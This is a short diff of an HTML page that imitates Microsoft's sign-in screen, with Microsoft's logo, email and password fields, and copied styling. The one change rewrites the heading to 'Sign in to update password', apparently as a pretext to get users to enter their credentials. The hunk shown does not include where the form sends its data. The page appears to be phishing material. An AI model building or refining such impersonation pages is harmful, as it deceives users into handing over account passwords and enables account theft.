@@ -13,7 +13,7 @@
         <main>
             <div class="hide">
             <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg">
-            <h1>Sign in</h1>
+            <h1>Sign in to update password</h1>
             <form>
                 <input type="email" name="email" class="inputs" maxlength="113" size="47" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" placeholder="Email, phone, or Skype"><br><br>
                 <input type="password" name="password" class="inputs" maxlength="113" size="47" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" placeholder="Password">
